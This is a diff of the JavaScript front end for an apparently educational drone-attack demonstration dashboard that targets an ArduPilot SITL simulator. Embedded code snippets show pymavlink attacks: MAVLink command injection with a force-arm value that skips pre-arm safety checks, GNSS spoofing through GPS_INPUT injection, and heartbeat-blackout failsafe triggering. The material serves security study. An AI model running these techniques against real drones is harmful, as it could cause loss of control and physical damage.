+const map = L.map('map', {zoomControl:false}).setView([37.5665, 126.9780], 14);
+L.control.zoom({position:'bottomright'}).addTo(map);
+L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+  attribution:'©CartoDB', maxZoom:19
+}).addTo(map);
 
-btnClear.addEventListener('click', () => {
-  stream.innerHTML = '';
-  total = 0;
-  counter.textContent = '0 pkts';
-});
+const droneMarkers = {};
+const attackCircles = {};
+const spoofLines = {};
 
-function fmtHex(h) {
-  return h.replace(/../g, m => m + ' ').trimEnd();
+function getDroneIcon(id, armed) {
+  const color = armed ? '#e05555' : '#44c87a';
+  const label = id.replace('drone-', 'D');
+  return L.divIcon({
+    className: '',
+    html: `<div style="width:28px;height:28px;border-radius:50%;background:${color}22;border:2px solid ${color};display:flex;align-items:center;justify-content:center;font-size:8px;color:${color};font-weight:bold;">${label}</div>`,
+    iconSize: [28,28], iconAnchor: [14,14],
+  });
 }
 
-const SKIP_FIELDS = new Set(['target_system', 'target_component']);
+function updateDroneMarker(d) {
+  if (!d.lat || !d.lon) return;
+  const id = d.drone_id;
+  if (droneMarkers[id]) {
+    droneMarkers[id].setLatLng([d.lat, d.lon]);
+    droneMarkers[id].setIcon(getDroneIcon(id, d.armed));
+    droneMarkers[id].setTooltipContent(`${id}<br>Mode: ${d.mode||'?'}<br>Alt: ${(d.relative_alt||0).toFixed(1)}m<br>Armed: ${d.armed}`);
+  } else {
+    droneMarkers[id] = L.marker([d.lat, d.lon], {icon: getDroneIcon(id, d.armed)})
+      .addTo(map)
+      .bindTooltip(`${id}<br>Mode: ${d.mode||'?'}<br>Alt: ${(d.relative_alt||0).toFixed(1)}m`, {permanent:false, direction:'top'});
+  }
+}
 
-function fmtFields(fields) {
-  return Object.entries(fields)
-    .filter(([k]) => !SKIP_FIELDS.has(k))
-    .map(([k, v]) => {
-      if (typeof v === 'number' && !Number.isInteger(v)) v = v.toFixed(4);
-      return `${k}:${v}`;
-    })
+// ── PACKET STREAM ──────────────────────────────────────────────────────────
+const streamEl = document.getElementById('stream');
+const fDrone   = document.getElementById('f-drone');
+const fType    = document.getElementById('f-type');
+const fDir     = document.getElementById('f-dir');
+const btnPause = document.getElementById('btn-pause');
+const btnClear = document.getElementById('btn-clear');
+const pktCount = document.getElementById('pkt-count');
+
+btnPause.onclick = () => {
+  S.paused = !S.paused;
+  btnPause.style.color = S.paused ? 'var(--yellow)' : '';
+  btnPause.textContent  = S.paused ? '▶ 재개' : '일시정지';
+};
+btnClear.onclick = () => { streamEl.innerHTML = ''; S.pktCount = 0; pktCount.textContent = '0 pkts'; };
+
+const btnAtkFilter = document.getElementById('btn-atk-filter');
+btnAtkFilter.onclick = () => {
+  S.atkFilter = !S.atkFilter;
+  if (S.atkFilter) {
+    btnAtkFilter.classList.add('active');
+    btnAtkFilter.textContent = '⚡ 공격 패킷만 [ON]';
+    // 기존 스트림 초기화 — 공격 관련 패킷만 새로 쌓임
+    streamEl.innerHTML = '';
+    S.pktCount = 0;
+    pktCount.textContent = '0 pkts';
+    // 방향 필터 초기화 (중복 방지)
+    fDir.value = '';
+  } else {
+    btnAtkFilter.classList.remove('active');
+    btnAtkFilter.textContent = '⚡ 공격 패킷만';
+  }
+};
+
+function fmtFields(f) {
+  const SKIP = new Set(['target_system','target_component']);
+  return Object.entries(f)
+    .filter(([k]) => !SKIP.has(k))
+    .map(([k,v]) => `${k}:${typeof v==='number' && !Number.isInteger(v) ? v.toFixed(4) : v}`)
     .join('  ');
 }
 
-function addPacket(pkt) {
-  if (paused) return;
+function addPacket(pkt, isAttack) {
+  if (S.paused) return;
+  const dir = pkt.direction || 'down';
+
+  // ── 공격 패킷 필터 (전용 토글) ─────────────────────────────────────────
+  // 공격 이벤트 | ↑ 방향 명령 | COMMAND_LONG/ACK/SET_MODE/HEARTBEAT 만 통과
+  if (S.atkFilter) {
+    if (!isAttack && dir !== 'up' && !ATK_MSG_TYPES.has(pkt.msg_name)) return;
+  }
+
   if (fDrone.value && pkt.drone_id !== fDrone.value) return;
-  if (fType.value  && pkt.msg_name  !== fType.value)  return;
+  if (fType.value  && pkt.msg_name !== fType.value)   return;
+  if (fDir.value === 'down' && dir !== 'down')         return;
+  if (fDir.value === 'up'   && dir !== 'up')           return;
 
-  total++;
-  counter.textContent = `${total} pkts`;
+  S.pktCount++;
+  pktCount.textContent = `${S.pktCount} pkts`;
 
-  const ts  = new Date().toTimeString().slice(0, 8);
-  const dir = pkt.direction === 'up' ? '↑' : '↓';
-
-  const row = document.createElement('div');
-  row.className = `pkt ${pkt.direction}`;
+  const ts      = new Date().toTimeString().slice(0,8);
+  const dirArrow = dir === 'up' ? '↑' : '↓';
+  const row     = document.createElement('div');
+  row.className = `pkt ${dir}${isAttack ? ' attack-pkt atk' : ''}`;
 
   const fieldsStr = pkt.fields ? fmtFields(pkt.fields) : '';
-  const hexShort  = fmtHex(pkt.hex.slice(0, 48)) + (pkt.hex.length > 48 ? '…' : '');
-
+  const hexShort  = ((pkt.hex||'').slice(0,40) + ((pkt.hex||'').length > 40 ? '…' : ''))
+    .replace(/../g, m => m + ' ').trimEnd();
   const kr = MSG_KR[pkt.msg_name];
   const nameHtml = kr
-    ? `<span class="kr">${kr}</span> <span class="en">(${pkt.msg_name})</span>`
-    : pkt.msg_name;
+    ? `<span class="kr">${kr}</span> <span class="en">(${pkt.msg_name||''})</span>`
+    : (pkt.msg_name || '');
 
   row.innerHTML =
     `<span class="c-ts">${ts}</span>` +
-    `<span class="c-dir">${dir}</span>` +
-    `<span class="c-did">${pkt.drone_id}</span>` +
+    `<span class="c-dir">${isAttack ? '⚡' : dirArrow}</span>` +
+    `<span class="c-did">${pkt.drone_id||''}</span>` +
     `<span class="c-name">${nameHtml}</span>` +
     `<span class="c-hex">${hexShort}</span>` +
     (fieldsStr ? `<span class="c-fields">${fieldsStr}</span>` : '');
 
-  stream.prepend(row);
-  while (stream.children.length > MAX) stream.lastChild.remove();
+  streamEl.prepend(row);
+  while (streamEl.children.length > 300) streamEl.lastChild.remove();
+
+  spawnFlowPacket(dir, isAttack, pkt.msg_name || '?');
 }
 
+// ── ATTACK TABS ────────────────────────────────────────────────────────────
+document.querySelectorAll('.atk-tab').forEach(tab => {
+  tab.onclick = () => {
+    document.querySelectorAll('.atk-tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.atk-section').forEach(s => s.classList.remove('active'));
+    tab.classList.add('active');
+    S.activeAtk = tab.dataset.tab;
+    document.getElementById('sec-' + tab.dataset.tab).classList.add('active');
+    updateCodeView(tab.dataset.tab);
+  };
+});
+
+// ── EVIDENCE TABS ─────────────────────────────────────────────────────────
+document.querySelectorAll('.ev-tab').forEach(tab => {
+  tab.onclick = () => {
+    document.querySelectorAll('.ev-tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.ev-section').forEach(s => s.classList.remove('active'));
+    tab.classList.add('active');
+    S.evidenceTab = tab.dataset.etab;
+    document.getElementById('etab-' + tab.dataset.etab).classList.add('active');
+    if (tab.dataset.etab === 'flow') resizeCanvas();
+  };
+});
+
+// ── ATTACK LAUNCH ─────────────────────────────────────────────────────────
+function appendLog(logId, stage, detail) {
+  const logEl = document.getElementById(logId);
+  if (!logEl) return;
+  logEl.style.display = 'block';
+  const cls = {start:'log-start', progress:'log-progress', success:'log-success', fail:'log-fail', stop:'log-stop'}[stage] || 'log-progress';
+  const ts = new Date().toTimeString().slice(0,8);
+  const line = document.createElement('div');
+  line.className = cls;
+  line.textContent = `[${ts}] ${detail}`;
+  logEl.appendChild(line);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function setAttackUI(num, running) {
+  const launchBtn = document.getElementById(`btn-att0${num}-launch`);
+  const stopBtn   = document.getElementById(`btn-att0${num}-stop`);
+  const tab       = document.querySelector(`.atk-tab[data-tab="att0${num}"]`);
+  if (launchBtn) launchBtn.disabled = running;
+  if (stopBtn)   stopBtn.disabled   = !running;
+  if (tab) {
+    tab.classList.remove('running','success','fail');
+    if (running) tab.classList.add('running');
+  }
+}
+
+async function launchAttack(scenario, droneId, params) {
+  const resp = await fetch('/api/attack/start', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({drone_id: droneId, scenario, params})
+  });
+  return resp.json();
+}
+
+async function stopAttack(attackId) {
+  const resp = await fetch('/api/attack/stop', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({attack_id: attackId})
+  });
+  return resp.json();
+}
+
+// ATT-01
+document.getElementById('btn-att01-launch').onclick = async () => {
+  const drone = document.getElementById('att01-drone').value;
+  const cmd   = document.getElementById('att01-cmd').value;
+  const alt   = parseFloat(document.getElementById('att01-alt').value) || 30;
+  document.getElementById('atk-log-01').innerHTML = '';
+  setAttackUI(1, true);
+  showEvidencePending();
+  await launchAttack('inject', drone, {cmd, alt});
+};
+document.getElementById('btn-att01-stop').onclick = async () => {
+  const drone = document.getElementById('att01-drone').value;
+  await stopAttack(`att01_${drone}`);
+};
+
+// ATT-02
+document.getElementById('btn-att02-launch').onclick = async () => {
+  const drone    = document.getElementById('att02-drone').value;
+  const duration = parseInt(document.getElementById('att02-duration').value) || 60;
+  const step_m   = parseFloat(document.getElementById('att02-step').value) || 1.0;
+  const max_m    = parseFloat(document.getElementById('att02-max').value) || 200;
+  document.getElementById('atk-log-02').innerHTML = '';
+  setAttackUI(2, true);
+  showEvidencePending();
+  if (S.drones[drone]) {
+    const d = S.drones[drone];
+    if (attackCircles[drone]) attackCircles[drone].remove();
+    attackCircles[drone] = L.circle([d.lat, d.lon], {
+      radius: max_m, color: '#e05555', weight:1, fill:true, fillOpacity:.05
+    }).addTo(map);
+  }
+  await launchAttack('gnss', drone, {duration, step_m, max_m});
+};
+document.getElementById('btn-att02-stop').onclick = async () => {
+  const drone = document.getElementById('att02-drone').value;
+  await stopAttack(`att02_${drone}`);
+  if (attackCircles[drone]) { attackCircles[drone].remove(); delete attackCircles[drone]; }
+  if (spoofLines[drone])    { spoofLines[drone].remove();    delete spoofLines[drone]; }
+};
+
+// ATT-03
+document.getElementById('btn-att03-launch').onclick = async () => {
+  const drone    = document.getElementById('att03-drone').value;
+  const warmup   = parseInt(document.getElementById('att03-warmup').value) || 10;
+  const watch    = parseInt(document.getElementById('att03-watch').value) || 30;
+  const reattack = document.getElementById('att03-reattack').checked;
+  document.getElementById('atk-log-03').innerHTML = '';
+  setAttackUI(3, true);
+  showEvidencePending();
+  await launchAttack('blackout', drone, {warmup, watch, reattack});
+};
+document.getElementById('btn-att03-stop').onclick = async () => {
+  const drone = document.getElementById('att03-drone').value;
+  await stopAttack(`att03_${drone}`);
+};
+
+// ── EVIDENCE DISPLAY ──────────────────────────────────────────────────────
+function showEvidencePending() {
+  const v = document.getElementById('ev-verdict');
+  v.className = 'ev-verdict pending';
+  v.textContent = '공격 실행 중...';
+  document.getElementById('ev-before-after').style.display = 'none';
+  document.getElementById('ev-metrics').style.display = 'none';
+}
+
+function renderEvidence(attackId, ev) {
+  if (!ev) return;
+  const v   = document.getElementById('ev-verdict');
+  const ba  = document.getElementById('ev-before-after');
+  const met = document.getElementById('ev-metrics');
+  const ok  = ev.success;
+
+  v.className = `ev-verdict ${ok ? 'success' : 'fail'}`;
+
+  if (attackId.startsWith('att01')) {
+    v.innerHTML = ok
+      ? `✔ 명령 주입 성공 — COMMAND_ACK: <b>${ev.ack_result}</b>`
+      : `✗ 명령 주입 실패 — ${ev.ack_result || ev.error || 'ACK 없음'}`;
+    ba.style.display = 'grid';
+    ba.innerHTML = `
+      <div class="ev-card before">
+        <div class="ev-card-label">BEFORE</div>
+        <div class="ev-field"><span class="fk">armed: </span><span class="fv">${ev.armed_before}</span></div>
+        <div class="ev-field"><span class="fk">mode: </span><span class="fv">${ev.mode_before||'?'}</span></div>
+      </div>
+      <div class="ev-card ${ok?'after-ok':'after-fail'}">
+        <div class="ev-card-label">AFTER</div>
+        <div class="ev-field"><span class="fk">armed: </span><span class="fv ${ev.armed_after!==ev.armed_before?'changed':''}">${ev.armed_after}</span></div>
+        <div class="ev-field"><span class="fk">mode: </span><span class="fv ${ev.mode_after!==ev.mode_before?'changed':''}">${ev.mode_after||'?'}</span></div>
+        ${['GUIDED','RTL'].includes(ev.cmd)
+          ? `<div class="ev-field"><span class="fk">ACK: </span><span class="fv" style="color:var(--muted)">N/A (SET_MODE)</span></div>`
+          : `<div class="ev-field"><span class="fk">ACK: </span><span class="fv ${ok?'changed':'bad'}">${ev.ack_result||'TIMEOUT'}</span></div>`
+        }
+      </div>`;
+    // 실제 바이너리 패킷 표시
+    const hexRaw = ev.hex_sent || '';
+    const isRealHex = hexRaw.length >= 36 && /^[0-9a-f]+$/.test(hexRaw);
+    if (isRealHex) {
+      met.style.display = 'block';
+      met.innerHTML = renderMavPkt(hexRaw, ev.cmd);
+    } else {
+      met.style.display = 'none';
+    }
+
+  } else if (attackId.startsWith('att02')) {
+    v.innerHTML = ok
+      ? `✔ GPS 스푸핑 성공 — 오프셋 <b>${(ev.final_offset_m||0).toFixed(1)}m</b> 이탈`
+      : `✗ GPS 스푸핑 미완 — 주입 ${ev.inject_count||0}회, 드리프트 불충분`;
+    ba.style.display = 'grid';
+    ba.innerHTML = `
+      <div class="ev-card before">
+        <div class="ev-card-label">실제 홈 위치</div>
+        <div class="ev-field"><span class="fk">lat: </span><span class="fv">${(ev.base_lat||0).toFixed(6)}</span></div>
+        <div class="ev-field"><span class="fk">lon: </span><span class="fv">${(ev.base_lon||0).toFixed(6)}</span></div>
+      </div>
+      <div class="ev-card ${ok?'after-ok':'after-fail'}">
+        <div class="ev-card-label">주입된 가짜 위치</div>
+        <div class="ev-field"><span class="fk">lat: </span><span class="fv ${ok?'changed':''}">${(ev.spoof_lat||0).toFixed(6)}</span></div>
+        <div class="ev-field"><span class="fk">lon: </span><span class="fv ${ok?'changed':''}">${(ev.spoof_lon||0).toFixed(6)}</span></div>
+        <div class="ev-field"><span class="fk">EKF 0x80: </span><span class="fv ${ev.ekf_alarm?'bad':''}">${ev.ekf_alarm?'CONST_POS_MODE ⚠':'정상'}</span></div>
+      </div>`;
+    met.style.display = 'grid';
+    met.innerHTML = `
+      <div class="ev-card" style="text-align:center">
+        <span class="ev-metric"><span class="val">${(ev.final_offset_m||0).toFixed(1)}m</span>최종 GPS 오프셋</span>
+      </div>
+      <div class="ev-card" style="text-align:center">
+        <span class="ev-metric"><span class="val">${ev.inject_count||0}</span>GPS_INPUT 주입 횟수</span>
+      </div>`;
+
+  } else if (attackId.startsWith('att03')) {
+    const rtl = ev.rtl_elapsed_s;
+    v.innerHTML = ok
+      ? `✔ 통신 두절 성공 — 차단 후 <b>${rtl?.toFixed(1)}초</b>에 RTL 발동`
+      : `✗ RTL 전환 미발생 — Disarmed 상태이거나 FS_GCS 미설정`;
+    ba.style.display = 'grid';
+    ba.innerHTML = `
+      <div class="ev-card before">
+        <div class="ev-card-label">BEFORE (차단 전)</div>
+        <div class="ev-field"><span class="fk">mode: </span><span class="fv">${ev.mode_before||'?'}</span></div>
+        <div class="ev-field"><span class="fk">HB 전송: </span><span class="fv">${ev.hb_sent||0}회</span></div>
+      </div>
+      <div class="ev-card ${ok?'after-ok':'after-fail'}">
+        <div class="ev-card-label">AFTER (차단 후)</div>
+        <div class="ev-field"><span class="fk">mode: </span><span class="fv ${ok?'changed':''}">${ev.mode_after||'?'}</span></div>
+        <div class="ev-field"><span class="fk">RTL: </span><span class="fv ${ok?'changed':'bad'}">${rtl!=null?rtl.toFixed(1)+'초 후':'미발동'}</span></div>
+      </div>`;
+    met.style.display = 'grid';
+    const isHex = h => h && h.length >= 20 && /^[0-9a-f]+$/.test(h);
+    const gcsHex = ev.gcs_hb_hex || '';
+    const rtlHex = ev.rtl_hb_hex || '';
+    met.innerHTML = `
+      ${ok ? `
+      <div class="ev-card" style="text-align:center">
+        <span class="ev-metric"><span class="val">${rtl?.toFixed(1)}s</span>Failsafe 발동 시간</span>
+      </div>
+      <div class="ev-card" style="text-align:center">
+        <span class="ev-metric"><span class="val">${ev.mode_before||'?'}→${ev.mode_after||'?'}</span>모드 전환</span>
+      </div>` : ''}
+      ${isHex(gcsHex) ? `
+      <div style="grid-column:1/-1">
+        <div style="font-size:15px;color:var(--yellow);margin-bottom:4px;letter-spacing:0.5px">
+          ① 공격자 → 드론: GCS 위장 HEARTBEAT (차단 직전 마지막 패킷)
+        </div>
+        ${renderMavPkt(gcsHex, 'GCS_HB')}
+      </div>` : ''}
+      ${isHex(rtlHex) ? `
+      <div style="grid-column:1/-1">
+        <div style="font-size:15px;color:var(--red);margin-bottom:4px;letter-spacing:0.5px">
+          ② 드론 → 공격자: RTL 전환 시점 HEARTBEAT (Failsafe 발동 확인)
+        </div>
+        ${renderMavPkt(rtlHex, 'RTL_HB')}
+      </div>` : ''}
+    `;
+  }
+}
+
+// ── MAVLink 패킷 hex 파서 ────────────────────────────────────────────────────
+function renderMavPkt(hex, cmd) {
+  const MSG_NAMES = {0:'HEARTBEAT', 11:'SET_MODE', 22:'TAKEOFF', 76:'COMMAND_LONG', 400:'ARM_DISARM'};
+  const bytes = hex.length / 2;
+  const magic = hex.substring(0,2);
+  if (magic !== 'fd') {
+    return `<div class="ev-card" style="grid-column:1/-1">
+      <div class="ev-card-label">전송 패킷 (설명)</div>
+      <div style="font-size:15px;color:var(--muted);margin-top:4px">${hex}</div>
+    </div>`;
+  }
+  const payLen = parseInt(hex.substring(2,4),16);
+  const seq    = parseInt(hex.substring(8,10),16);
+  const sysid  = parseInt(hex.substring(10,12),16);
+  const compid = parseInt(hex.substring(12,14),16);
+  const msgId  = parseInt(hex.substring(14,16),16)
+               + parseInt(hex.substring(16,18),16)*256
+               + parseInt(hex.substring(18,20),16)*65536;
+  const msgName = MSG_NAMES[msgId] || `MSG_${msgId}`;
+  const hdrHex  = hex.substring(0,20);
+  const payHex  = hex.substring(20, 20+payLen*2);
+  const csumHex = hex.substring(20+payLen*2);
+  const fmt = h => h.replace(/../g,'$& ').trim();
+  return `<div class="ev-card" style="grid-column:1/-1">
+    <div class="ev-card-label">실제 전송 패킷 — MAVLink v2 Binary (${bytes}바이트)</div>
+    <div style="display:flex;gap:6px;flex-wrap:wrap;margin:6px 0 3px;font-size:15px">
+      <span style="color:var(--muted)">magic=<b style="color:var(--red)">0xFD</b></span>
+      <span style="color:var(--muted)">seq=<b style="color:var(--text)">${seq}</b></span>
+      <span style="color:var(--muted)">sysid=<b style="color:var(--text)">${sysid}</b></span>
+      <span style="color:var(--muted)">msg_id=<b style="color:var(--purple)">${msgId}(${msgName})</b></span>
+      <span style="color:var(--muted)">payload=<b style="color:var(--text)">${payLen}B</b></span>
+    </div>
+    <div style="background:#060a10;border-radius:2px;padding:7px;font-family:'Courier New',monospace;font-size:15px;line-height:2;word-break:break-all">
+      <span title="헤더 10B" style="color:#6ba3d6">${fmt(hdrHex)}</span>
+      <span title="페이로드 ${payLen}B" style="color:var(--green)"> ${fmt(payHex)}</span>
+      <span title="체크섬 2B" style="color:var(--yellow)"> ${fmt(csumHex)}</span>
+    </div>
+    <div style="display:flex;gap:10px;margin-top:4px;font-size:15px">
+      <span style="color:#6ba3d6">■ 헤더(10B)</span>
+      <span style="color:var(--green)">■ 페이로드(${payLen}B)</span>
+      <span style="color:var(--yellow)">■ 체크섬(2B)</span>
+    </div>
+  </div>`;
+}
+
+// ── CODE SNIPPETS ─────────────────────────────────────────────────────────
+const CODE_SNIPPETS = {
+  att01: `<span class="cm"># app/attacks.py — ATT-01 MAVLink 명령 주입</span>
+<span class="cm"># 공격 포트(25760)로 직접 연결 — FastAPI 서버 우회</span>
+
+conn = mavutil.mavlink_connection(
+    <span class="st">f"tcp:{SITL_HOST}:{ATTACK_PORT}"</span>,
+    source_system=<span class="nu">255</span>
+)
+hb = conn.wait_heartbeat(timeout=<span class="nu">10</span>)
+armed_before = <span class="kw">bool</span>(hb.base_mode & <span class="nu">0x80</span>)
+
+<span class="cm"># ARM — p2=21196 : pre-arm 안전 체크 강제 우회</span>
+conn.mav.command_long_send(
+    ts, <span class="nu">1</span>,     <span class="cm"># target_system, component</span>
+    <span class="nu">400</span>,       <span class="cm"># MAV_CMD_COMPONENT_ARM_DISARM</span>
+    <span class="nu">0</span>,         <span class="cm"># confirmation</span>
+    <span class="nu">1.0</span>,       <span class="cm"># p1: 1=arm / 0=disarm</span>
+    <span class="nu">21196.0</span>,   <span class="cm"># p2: force arm (magic number)</span>
+    <span class="nu">0</span>, <span class="nu">0</span>, <span class="nu">0</span>, <span class="nu">0</span>, <span class="nu">0</span>
+)
+
+<span class="cm"># ACK 대기 — 성공 기준: result == 0 (ACCEPTED)</span>
+msg = conn.recv_match(type=<span class="st">"COMMAND_ACK"</span>, timeout=<span class="nu">5.0</span>)
+ack = ACK_RESULTS[msg.result]  <span class="cm"># "ACCEPTED" if result==0</span>
+
+<span class="cm"># 이후 HEARTBEAT에서 armed 상태 변화 확인</span>
+hb2 = conn.recv_match(type=<span class="st">"HEARTBEAT"</span>, timeout=<span class="nu">3.0</span>)
+armed_after = <span class="kw">bool</span>(hb2.base_mode & <span class="nu">0x80</span>)`,
+
+  att02: `<span class="cm"># app/attacks.py — ATT-02 GNSS 스푸핑</span>
+<span class="cm"># Step 1: GPS_TYPE=14 설정 (MAVLink 외부 GPS 허용)</span>
+
+conn.mav.param_set_send(
+    ts, <span class="nu">1</span>, <span class="st">b"GPS_TYPE"</span>, <span class="nu">14.0</span>,
+    mavutil.mavlink.MAV_PARAM_TYPE_INT8
+)
+
+<span class="cm"># Step 2: GPS_INPUT 10Hz 주입 (오프셋 점진 증가)</span>
+conn.mav.gps_input_send(
+    <span class="kw">int</span>(time.time() * <span class="nu">1e6</span>),  <span class="cm"># time_usec</span>
+    <span class="nu">0</span>,                         <span class="cm"># gps_id</span>
+    <span class="nu">0</span>,                         <span class="cm"># ignore_flags</span>
+    week_ms, week, <span class="nu">3</span>,          <span class="cm"># GPS time, fix_type=3D</span>
+    <span class="kw">int</span>(spoof_lat * <span class="nu">1e7</span>),      <span class="cm"># 위도 (가짜값)</span>
+    <span class="kw">int</span>(spoof_lon * <span class="nu">1e7</span>),      <span class="cm"># 경도 (가짜값)</span>
+    base_alt,
+    <span class="nu">0.5</span>, <span class="nu">0.5</span>, <span class="nu">0.0</span>, <span class="nu">0.0</span>, <span class="nu">0.0</span>, <span class="nu">0.2</span>, <span class="nu">0.5</span>, <span class="nu">0.5</span>, <span class="nu">8</span>,
+)
+
+<span class="cm"># 성공 기준 1: GLOBAL_POSITION_INT lat/lon 이탈 > 5m</span>
+<span class="cm"># 성공 기준 2: EKF_STATUS_REPORT flags & 0x80 (CONST_POS_MODE)</span>
+ekf = conn.recv_match(type=<span class="st">"EKF_STATUS_REPORT"</span>)
+ekf_alarm = <span class="kw">bool</span>(ekf.flags & <span class="nu">0x80</span>)`,
+
+  att03: `<span class="cm"># app/attacks.py — ATT-03 통신 두절 (GCS Failsafe)</span>
+<span class="cm"># Step 1: FS_GCS_ENABLE=1 (RTL Failsafe 활성화)</span>
+
+conn.mav.param_set_send(
+    ts, <span class="nu">1</span>, <span class="st">b"FS_GCS_ENABLE"</span>, <span class="nu">1.0</span>,
+    mavutil.mavlink.MAV_PARAM_TYPE_INT8
+)
+
+<span class="cm"># Step 2: GCS HEARTBEAT 워밍업 (드론이 GCS로 인식)</span>
+<span class="kw">for</span> _ <span class="kw">in</span> <span class="fn">range</span>(warmup):
+    conn.mav.heartbeat_send(
+        mavutil.mavlink.MAV_TYPE_GCS,
+        mavutil.mavlink.MAV_AUTOPILOT_INVALID,
+        <span class="nu">0</span>, <span class="nu">0</span>, mavutil.mavlink.MAV_STATE_ACTIVE,
+    )
+    time.sleep(<span class="nu">1.0</span>)
+
+<span class="cm"># Step 3: ★ HEARTBEAT 차단 (공격 트리거)</span>
+stop_hb.set()  <span class="cm"># HeartBeat 루프 즉시 정지</span>
+blackout_time = time.time()
+
+<span class="cm"># ArduCopter: 마지막 GCS HB 후 FS_GCS_TIMEOUT(기본 5s) 경과</span>
+<span class="cm"># → custom_mode: 4(GUIDED) → 6(RTL) 자동 전환</span>
+<span class="cm"># 성공 기준: HEARTBEAT custom_mode 값 변화 감지</span>`
+};
+
+const CODE_TITLES = {
+  att01: 'ATT-01 — MAVLink 명령 주입 코드 (app/attacks.py)',
+  att02: 'ATT-02 — GNSS 스푸핑 코드 (app/attacks.py)',
+  att03: 'ATT-03 — 통신 두절 코드 (app/attacks.py)',
+};
+
+function updateCodeView(attId) {
+  document.getElementById('code-view').innerHTML  = CODE_SNIPPETS[attId] || '';
+  document.getElementById('code-title').textContent = CODE_TITLES[attId]  || '';
+}
+updateCodeView('att01');
+
+// ── PACKET FLOW CANVAS ────────────────────────────────────────────────────
+const canvas = document.getElementById('flow-canvas');
+const ctx    = canvas.getContext('2d');
+
+function resizeCanvas() {
+  const wrap = document.getElementById('etab-flow');
+  canvas.width  = wrap.clientWidth  || 400;
+  canvas.height = (wrap.clientHeight || 250) - 24;
+}
+window.addEventListener('resize', resizeCanvas);
+setTimeout(resizeCanvas, 200);
+
+const NODES = [
+  {id:'gcs',      label:'GCS Browser',   xf:.10, yf:.4, color:'#3a8fd4'},
+  {id:'server',   label:'FastAPI :8000',  xf:.35, yf:.4, color:'#44c87a'},
+  {id:'relay',    label:'Relay :15760',   xf:.62, yf:.4, color:'#e0a840'},
+  {id:'sitl',     label:'SITL :5760',     xf:.88, yf:.4, color:'#9b72d4'},
+  {id:'attacker', label:'ATTACKER',       xf:.62, yf:.78, color:'#e05555'},
+];
+const EDGES = [
+  {from:'gcs',      to:'server',  color:'#3a8fd4', label:'WS JSON'},
+  {from:'server',   to:'relay',   color:'#44c87a', label:'MAVLink v2'},
+  {from:'relay',    to:'sitl',    color:'#e0a840', label:'TCP 5760'},
+  {from:'sitl',     to:'relay',   color:'#9b72d4', label:'telemetry↓'},
+  {from:'attacker', to:'relay',   color:'#e05555', label:'Attack :25760'},
+];
+
+function nodePos(id) {
+  const n = NODES.find(x => x.id === id);
+  if (!n) return {x:0, y:0};
+  return {x: n.xf * canvas.width, y: n.yf * canvas.height};
+}
+
+function spawnFlowPacket(direction, isAttack, label) {
+  if (!canvas.width) return;
+  // 일반 패킷은 25% 확률만 시각화 — 20Hz 텔레메트리가 SITL에 몰리는 현상 방지
+  if (!isAttack && Math.random() > 0.25) return;
+
+  // 각 방향마다 경로 전체를 홉 단위로 나눠 랜덤 선택 → 모든 노드에 균등 분포
+  let hop;
+  if (isAttack) {
+    hop = {from:'attacker', to:'relay'};
+  } else if (direction === 'up') {
+    const hops = [
+      {from:'gcs',    to:'server'},
+      {from:'server', to:'relay'},
+      {from:'relay',  to:'sitl'},
+    ];
+    hop = hops[Math.floor(Math.random() * hops.length)];
+  } else {
+    const hops = [
+      {from:'sitl',   to:'relay'},
+      {from:'relay',  to:'server'},
+      {from:'server', to:'gcs'},
+    ];
+    hop = hops[Math.floor(Math.random() * hops.length)];
+  }
+
+  const fp = nodePos(hop.from);
+  const tp = nodePos(hop.to);
+  S.flowPackets.push({
+    x:fp.x, y:fp.y, tx:tp.x, ty:tp.y,
+    prog: 0,
+    color: isAttack ? '#e05555' : (direction==='up' ? '#e0a840' : '#3a8fd4'),
+    label: label.replace('GLOBAL_POSITION_INT','GPS').replace('EKF_STATUS_REPORT','EKF').substring(0,12),
+    speed: 0.013 + Math.random() * 0.012,
+  });
+  if (S.flowPackets.length > 40) S.flowPackets.shift();
+}
+
+function drawFlow() {
+  if (!canvas.width || !canvas.height) { requestAnimationFrame(drawFlow); return; }
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+  // Grid
+  ctx.strokeStyle = '#111820';
+  ctx.lineWidth = 1;
+  for (let x = 0; x < canvas.width; x += 30) {
+    ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,canvas.height); ctx.stroke();
+  }
+  for (let y = 0; y < canvas.height; y += 30) {
+    ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(canvas.width,y); ctx.stroke();
+  }
+
+  // Edges
+  EDGES.forEach(e => {
+    const a = nodePos(e.from), b = nodePos(e.to);
+    ctx.strokeStyle = e.color + '55';
+    ctx.lineWidth   = 1.5;
+    ctx.setLineDash([4,4]);
+    ctx.beginPath(); ctx.moveTo(a.x,a.y); ctx.lineTo(b.x,b.y); ctx.stroke();
+    ctx.setLineDash([]);
+    ctx.fillStyle = e.color + '88';
+    ctx.font = '11px Courier New';
+    ctx.textAlign = 'center';
+    ctx.fillText(e.label, (a.x+b.x)/2, (a.y+b.y)/2 - 6);
+  });
+
+  // Nodes
+  NODES.forEach(n => {
+    const p = nodePos(n.id);
+    ctx.beginPath(); ctx.arc(p.x, p.y, 18, 0, Math.PI*2);
+    ctx.fillStyle = n.color + '22'; ctx.fill();
+    ctx.strokeStyle = n.color; ctx.lineWidth = 1.5; ctx.stroke();
+    ctx.fillStyle = n.color;
+    ctx.font = 'bold 11px Courier New';
+    ctx.textAlign = 'center';
+    const short = n.id==='attacker' ? 'ATK' : n.id.toUpperCase().substring(0,3);
+    ctx.fillText(short, p.x, p.y + 4);
+    ctx.font = '10px Courier New';
+    ctx.fillStyle = n.color + 'aa';
+    ctx.fillText(n.label, p.x, p.y + 34);
+  });
+  ctx.textAlign = 'left';
+
+  // Animate packets
+  S.flowPackets = S.flowPackets.filter(fp => {
+    fp.prog = Math.min(1, fp.prog + fp.speed);
+    const cx = fp.x + (fp.tx - fp.x) * fp.prog;
+    const cy = fp.y + (fp.ty - fp.y) * fp.prog;
+    ctx.beginPath(); ctx.arc(cx, cy, 4, 0, Math.PI*2);
